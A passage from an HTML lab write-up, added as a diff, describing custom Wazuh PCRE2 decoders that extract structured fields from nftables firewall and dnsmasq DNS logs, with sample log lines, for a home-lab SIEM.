@@ -1,0 +1,723 @@
+<!DOCTYPE html> <html lang="en"><head>
+<title>Developing Wazuh Decoders and Rules for Lab Firewall</title>
+<base href="..">
+<meta name="pathname" content="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html">
+<meta name="description" content="Explorer - Developing Wazuh Decoders and Rules for Lab Firewall">
+<meta property="og:title" content="Developing Wazuh Decoders and Rules for Lab Firewall">
+<meta property="og:description" content="Explorer - Developing Wazuh Decoders and Rules for Lab Firewall">
+<meta property="og:type" content="website">
+<meta property="og:url" content="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html">
+<meta property="og:image" content="_files/pasted-image-20260803175859.png">
+<meta charset="UTF-8"><meta property="og:site_name" content="Explorer"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-wasm-script" src="site-lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="site-lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="preload" href="site-lib/styles/snippets.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/snippets.css"></noscript><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script><style>
+/* Hide _files directories in file explorer */
+/* Hide parent when child has _files in data-path */
+.tree-item > .tree-item-self[data-path*="_files"],
+.tree-item[data-path*="_files"] {
+  display: none !important;
+}
+/* Hide sibling children of the folder */
+.tree-item-self[data-path*="_files"] ~ .tree-item-children {
+  display: none !important;
+}
+/* Hide the entire tree-item folder wrapper */
+.nav-folder:has(> .tree-item-self[data-path*="_files"]) {
+  display: none !important;
+}
+</style>
+</head><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">document.body.classList.add("theme-dark");document.body.classList.remove("theme-light");window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><div id="search-container"><div id="search-wrapper"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div aria-label="Clear search" id="search-clear-button"></div></div></div></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"><link itemprop="include" href="site-lib/html/file-tree-content.html"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Developing_Wazuh_Decoders_and_Rules_for_Lab_Firewall_0">Developing Wazuh Decoders and Rules for Lab Firewall</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-p"><p dir="auto">Date: Aug 8, 2026<br>
+Tags: <a data-href="Network Security" href="tags/network-security.html" class="internal-link" target="_self" rel="noopener nofollow">Network Security</a> <a data-href="Threat Detection" href="tags/threat-detection.html" class="internal-link" target="_self" rel="noopener nofollow">Threat Detection</a> <a data-href="Log Management" href="tags/log-management.html" class="internal-link" target="_self" rel="noopener nofollow">Log Management</a> <a data-href="Regex" href="tags/regex.html" class="internal-link" target="_self" rel="noopener nofollow">Regex</a> <a data-href="SIEM" href="tags/siem.html" class="internal-link" target="_self" rel="noopener nofollow">SIEM</a> <a data-href="DNS" href="tags/dns.html" class="internal-link" target="_self" rel="noopener nofollow">DNS</a> <a data-href="Firewall" href="tags/firewall.html" class="internal-link" target="_self" rel="noopener nofollow">Firewall</a> <a data-href="Wazuh" href="tags/wazuh.html" class="internal-link" target="_self" rel="noopener nofollow">Wazuh</a> <a data-href="nftables" href="tags/nftables.html" class="internal-link" target="_self" rel="noopener nofollow">nftables</a> <a data-href="dnsmasq" href="tags/dnsmasq.html" class="internal-link" target="_self" rel="noopener nofollow">dnsmasq</a> <a data-href="Powershell" href="tags/powershell.html" class="internal-link" target="_self" rel="noopener nofollow">Powershell</a> <a data-href="Nmap" href="tags/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> <a data-href="Linux" href="tags/linux.html" class="internal-link" target="_self" rel="noopener nofollow">Linux</a></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20260803175859.png" src="_files/pasted-image-20260803175859.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260803175859.png" src="_files/pasted-image-20260803175859.png" target="_self"></span></p></div><div class="el-h5"><h5 data-heading="I. Project Summary" dir="auto" class="heading" id="I._Project_Summary_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>I. Project Summary</h5></div><div class="el-p"><p dir="auto">In my previous lab entries, I configured a network firewall and routed its logs to a Wazuh SIEM. However, raw logs have limited context, making it difficult for detection rules to correlate specific attributes such as DNS query type, source IP, and firewall action.</p></div><div class="el-p"><p dir="auto">To solve this, I created custom PCRE2 decoders to extract structured fields from nftables and dnsmasq logs. I then created detection rules mapped to the MITRE ATT&amp;CK framework to identify possible indicators of compromise, such as spikes in NXDOMAIN queries and abnormally long DNS queries. Identifying these attacks early can help defenders investigate and respond before they lead to further impact.<br>
+<span alt="Pasted image 20260822161238.png" src="_files/pasted-image-20260822161238.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260822161238.png" src="_files/pasted-image-20260822161238.png" target="_self"></span></p></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="arch" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-network"><rect x="16" y="16" width="6" height="6" rx="1"></rect><rect x="2" y="16" width="6" height="6" rx="1"></rect><rect x="9" y="2" width="6" height="6" rx="1"></rect><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3"></path><path d="M12 12V8"></path></svg></div><div class="callout-title-inner">Network Topology Diagram</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">AntiX Firewall is running <code>nftables</code>, <code>dnsmasq</code>, and <code>wireguard</code>.<br>
+<span alt="Pasted image 20260628125617.png" src="_files/pasted-image-20260628125617.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260628125617.png" src="_files/pasted-image-20260628125617.png" target="_self"></span></p>
+</div></div></div><div class="el-h5"><h5 data-heading="II. Key Engineering Decisions" dir="auto" class="heading" id="II._Key_Engineering_Decisions_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>II. Key Engineering Decisions</h5></div><div class="el-h6"><h6 data-heading="1. Created and Enhanced Telemetry Parsing" dir="auto" class="heading" id="1._Created_and_Enhanced_Telemetry_Parsing_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>1. Created and Enhanced Telemetry Parsing</h6></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Developed custom Wazuh decoders for dnsmasq and nftables telemetry using PCRE2 regular expressions. The parsers extract contextual fields such as source IP, DNS query type, requested domain, firewall action, and network interface. This enables more accurate rule matching and improves investigation and threat hunting.</li>
+</ul></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Enhanced Nftables and Custom Dnsmasq Decoders </div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto"><strong>Nftables</strong><br>
+I first started by running <code>wazuh-logtest</code> and discovered nftables log matches with the built in kernel and its child iptables decoder which does not extract the fields that i needed so I created a custom decoder:</p>
+<pre class="language-xml"><code data-line="3" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kernel<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>program_name</span><span class="token punctuation">&gt;</span></span>^kernel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>program_name</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-nftables<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>kernel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>NFT-(?:IN|FOR|OUT)-(?:DROP|ACCEPT)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>NFT-(IN|FOR|OUT)-(DROP|ACCEPT)(?:-(\S+))?\s+IN=(\S*)\s+OUT=(\S*)\s+(?:MAC=\S*\s+)?SRC=([0-9.]+)\s+DST=([0-9.]+).*?PROTO=(\w+)(?:\s+SPT=(\d+)\s+DPT=(\d+))?(?:\s+TYPE=(\d+)\s+CODE=(\d+))?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+order&gt;nft_chain,nft_action,nft_rule,nft_srcint,nft_dstint,srcip,dstip,protocol,srcport,dstport,icmp_type,icmp_code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: /var/ossec/etc/decoders/nftables.xml (Wazuh_Server)</code></p>
+<hr>
+<p dir="auto"><strong>Dnsmasq</strong><br>
+While dnsmasq also matches a built-in Wazuh decoder, it was unable to extract any useful fields so i created a custom decoder for dnsmasq. There are multiple decoders this time because dnsmasq logs have multiple formats.</p>
+<pre class="language-xml"><code data-line="19" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>program_name</span><span class="token punctuation">&gt;</span></span>^dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>program_name</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token comment">&lt;!-- log: dnsmasq: 1001 10.0.0.50/51234 query[A] ://google.com from 10.0.0.50 --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq-query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>antix-dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>query\[\w+\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(query\[\w+\])\s+(\S+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>id,srcip,srcport,dns_action,url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token comment">&lt;!-- log: dnsmasq: 1001 10.0.0.50/51234 forwarded ://google.com to 8.8.8.8 --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq-forwarded<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>antix-dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>forwarded<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(forwarded)\s+(\S+)\s+to\s+(\S+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>id,srcip,srcport,dns_action,url,resolved_to<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token comment">&lt;!-- log: dnsmasq: 1001 10.0.0.50/51234 reply ://google.com is 142.250.190.36 --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq-reply<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>antix-dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>reply<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(reply)\s+(\S+)\s+is\s+(.+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>id,srcip,srcport,dns_action,url,resolved_to<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token comment">&lt;!-- log: dnsmasq: 1012 10.0.0.50/51245 config www.chess.com is NXDOMAIN --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq-local<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>antix-dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>config|/etc/hosts|cached<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(\S+)\s+(\S+)\s+is\s+(.+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>id,srcip,srcport,dns_action,url,resolved_to<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token comment">&lt;!-- log: dnsmasq[6203]: exiting on receipt of SIGTERM  --&gt;</span>
